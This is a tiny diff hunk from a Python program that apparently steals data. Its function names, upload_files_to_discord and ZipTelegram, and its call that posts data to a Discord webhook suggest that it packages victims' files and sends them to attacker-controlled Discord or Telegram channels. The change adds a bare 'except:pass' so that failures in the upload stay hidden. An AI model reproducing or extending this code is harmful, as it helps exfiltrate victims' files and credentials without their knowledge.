@@ -840,6 +840,7 @@ def upload_files_to_discord():
             }
     
             LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:pass
 def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
